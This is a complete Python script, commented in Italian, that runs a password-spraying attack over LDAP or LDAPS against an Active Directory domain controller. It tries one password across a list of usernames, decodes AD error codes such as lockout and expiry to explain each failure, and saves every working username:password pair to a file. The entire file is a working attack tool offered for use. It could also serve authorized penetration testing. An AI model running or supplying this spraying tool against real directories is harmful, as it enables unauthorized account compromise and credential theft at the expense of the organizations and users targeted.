import sys
import os
import time
import re
import argparse

try:
    from ldap3 import Server, Connection, SIMPLE
    from ldap3.core.exceptions import LDAPBindError, LDAPException
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False


def check_ldap3():
    if not HAS_LDAP3:
        print("[-] Errore: La libreria 'ldap3' non è installata.")
        print("    Installa le dipendenze eseguendo: pip install -r requirements.txt")
        sys.exit(1)


def parse_ad_error(error_str):
    """
    Decodifica i codici diagnostici di Active Directory restituiti nell'errore LDAP.
    Codici comuni:
      525 - user not found
      52e - invalid credentials
      530 - not permitted to log on at this time
      531 - not permitted to log on from this workstation
      532 - password expired
      533 - account disabled
      701 - account expired
      773 - user must reset password
      775 - user account locked out
    """
    match = re.search(r'data ([0-9a-fA-F]{3})', error_str)
    if match:
        ad_code = match.group(1).lower()
        if ad_code == '52e':
            return "Password errata"
        elif ad_code == '525':
            return "Utente non trovato"
        elif ad_code == '533':
            return "Account disabilitato"
        elif ad_code == '701':
            return "Account scaduto"
        elif ad_code == '773':
            return "Cambio password obbligatorio al prossimo accesso"
        elif ad_code == '775':
            return "Account bloccato (Lockout)"
        elif ad_code == '530':
            return "Accesso non consentito a quest'ora"
        elif ad_code == '531':
            return "Accesso non consentito da questa postazione"
        elif ad_code == '532':
            return "Password scaduta"
        else:
            return f"Codice errore AD sconosciuto: {ad_code}"
    return "Errore di autenticazione generico"


def attempt_login(dc_ip, username, password, domain=None, use_ssl=False):
    # Formattiamo lo username nel formato UPN (user@domain.com) se il dominio è fornito
    # Altrimenti lo lasciamo intatto (ad esempio se l'utente ha inserito già UPN o DN)
    bind_user = username
    if domain and "@" not in username and "\\" not in username:
        bind_user = f"{username}@{domain}"

    port = 636 if use_ssl else 389
    server = Server(dc_ip, port=port, use_ssl=use_ssl, get_info=None)

    try:
        # Tenta una connessione sincrona con timeout ridotto per non rallentare lo spray
        conn = Connection(server, user=bind_user, password=password, authentication=SIMPLE, receive_timeout=10)
        if conn.bind():
            conn.unbind()
            return True, "Successo"
        else:
            # A volte bind() ritorna False senza eccezioni se le credenziali sono errate
            return False, "Credenziali non valide"
    except LDAPBindError as e:
        reason = parse_ad_error(str(e))
        return False, reason
    except LDAPException as e:
        return False, f"Errore di connessione LDAP: {e}"
    except Exception as e:
        return False, f"Errore imprevisto: {e}"


def main():
    parser = argparse.ArgumentParser(
        description="Esegue un attacco di password spraying via LDAP/LDAPS contro un Domain Controller Active Directory."
    )
    parser.add_argument(
        "target_host",
        help="IP o hostname del Domain Controller AD (es. 192.168.1.10 o dc.corp.local)"
    )
    parser.add_argument(
        "user_list",
        help="Percorso del file di testo contenente l'elenco degli username (uno per riga)"
    )
    parser.add_argument(
        "password",
        help="La password da testare su tutti gli account dell'elenco"
    )
    parser.add_argument(
        "-d",
        "--domain",
        default=None,
        help="Il nome del dominio AD da usare per formattare gli utenti (es. corp.local)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Tempo di attesa in secondi tra un tentativo e il successivo (default: 0.0)"
    )
    parser.add_argument(
        "-o",
        "--output",
        default="valid_credentials.txt",
        help="File in cui salvare le credenziali valide trovate (default: valid_credentials.txt)"
    )
    parser.add_argument(
        "--ssl",
        action="store_true",
        help="Usa una connessione cifrata LDAPS su porta 636 (anziché LDAP su porta 389)"
    )

    args = parser.parse_args()
    check_ldap3()

    if not os.path.exists(args.user_list):
        print(f"[-] Errore: Il file degli utenti '{args.user_list}' non esiste!")
        sys.exit(1)

    # Leggiamo gli utenti dal file
    with open(args.user_list, "r", encoding="utf-8", errors="ignore") as f:
        users = [line.strip() for line in f if line.strip()]

    if not users:
        print("[-] Errore: Il file degli utenti è vuoto.")
        sys.exit(1)

    print(f"[*] Avvio password spraying contro {args.target_host}...")
    print(f"[*] Totale utenti da testare: {len(users)}")
    print(f"[*] Password da spruzzare: '{args.password}'")
    print(f"[*] Dominio specificato: {args.domain if args.domain else 'Nessuno (si presuppone UPN o nomi completi)'}")
    print(f"[*] Delay configurato: {args.delay}s")
    print(f"[*] Connessione: {'LDAPS (Port 636)' if args.ssl else 'LDAP (Port 389)'}")
    print("=" * 60)

    success_count = 0
    fail_count = 0

    with open(args.output, "a", encoding="utf-8") as out_file:
        for idx, user in enumerate(users, 1):
            # Eseguiamo un delay se configurato (tranne che per la prima richiesta)
            if idx > 1 and args.delay > 0:
                time.sleep(args.delay)

            print(f"[{idx}/{len(users)}] Test utente: {user}...", end="", flush=True)
            success, reason = attempt_login(
                dc_ip=args.target_host,
                username=user,
                password=args.password,
                domain=args.domain,
                use_ssl=args.ssl
            )

            if success:
                print("\r\033[K" + f"[+] SUCCESSO: {user}:{args.password}")
                out_file.write(f"{user}:{args.password}\n")
                out_file.flush()
                success_count += 1
            else:
                # Mostra il motivo preciso del fallimento se possibile
                print("\r\033[K" + f"[-] FALLITO: {user} - {reason}")
                fail_count += 1

    print("=" * 60)
    print(f"[*] Scansione completata!")
    print(f"[+] Credenziali valide trovate: {success_count} (salvate in '{args.output}')")
    print(f"[-] Credenziali errate/fallite: {fail_count}")


if __name__ == "__main__":
    main()
